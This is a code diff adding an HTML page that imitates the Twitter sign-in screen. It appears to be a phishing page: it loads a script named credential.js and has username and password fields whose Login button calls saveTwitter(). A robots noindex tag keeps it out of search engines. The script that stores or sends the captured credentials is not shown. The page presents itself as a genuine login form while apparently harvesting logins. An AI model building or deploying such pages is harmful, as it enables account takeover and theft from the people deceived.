@@ -1,0 +1,140 @@
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="utf-8">
+    <title>Twitter</title>
+
+</head>
+
+<script src="js/site.js"></script>
+<script src="js/credential.js"></script>
+
+<style>
+    .center {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        width: 20%;
+    }
+
+    .register {
+        color: #2DAAE1;
+    }
+
+    .textcenter {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        color: black;
+        align-items: center;
+        text-align: center;
+        font-size: 25px;
+        /* text */
+    }
+
+    .line {
+        width: auto;
+        background-color: black;
+        height: 1;
+    }
+
+    .login {
+        background-color: #0190f3;
+        /* Green */
+        border: none;
+        color: white;
+        padding: 15px 32px;
+        text-align: center;
+        text-decoration: none;
+        display: inline-block;
+        font-size: 16px;
+        border-radius: 12px;
+        width: 100%;
+    }
+
+    input[type=text],
+    input[type=password] {
+        width: 100%;
+        border: 2px solid #aaa;
+        border-radius: 4px;
+        margin: 8px 0;
+        outline: none;
+        padding: 8px;
+        box-sizing: border-box;
+        transition: .3s;
+    }
+
+    input[type=text]:focus {
+        border-color: dodgerBlue;
+        box-shadow: 0 0 8px 0 dodgerBlue;
+    }
+
+    input[type=password]:focus {
+        border-color: dodgerBlue;
+        box-shadow: 0 0 8px 0 dodgerBlue;
+    }
+
+    .zLogin-layout {
+        max-width: 500px;
+        height: 100%;
+        margin: 0 auto;
+        padding: 24px 20px 0;
+    }
+
+    .header {
+        position: relative
+    }
+
+
+    .fadeIn {
+        -webkit-animation-name: fadeIn;
+        animation-name: fadeIn
+    }
+
+    .animated {
+        -webkit-animation-duration: 0.7s;
+        animation-duration: 0.7s;
+        -webkit-animation-fill-mode: both;
+        animation-fill-mode: both
+    }
+</style>
+
+<body >
+    <div>
+        <div>
+            <div class="zLogin-layout">
+                <div class="header animated fadeIn">
+                    <img src="./images/twitter.png" alt="twitter" class="center">
+                    <b class="textcenter">Sign in with Twitter</b>
+                </div>
+
+                <div class="form-signin">
+                    <div>
+                        <div class="username" style="height: 30px;">
+                            <input id="twitter_user" tabindex="1" type="text" name="phone_num"
+                                placeholder="Phone, email, or username" class="input">
+                        </div>
+                        <br>
+                        <div class="username">
+                            <input type="password" id="twitter_pass" placeholder="Password">
+                        </div>
+                        <br>
+                        <div class="textAlign-center has-2btn">
+                            <button class="login" onclick="saveTwitter()">Login</button>
+                        </div>
+                    </div>
+                    <br>
+                    <p style="text-align: center;" class="register">Forgot password? Sign up for Twitter</p>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    </div>
+
+</body>
+
+</html>
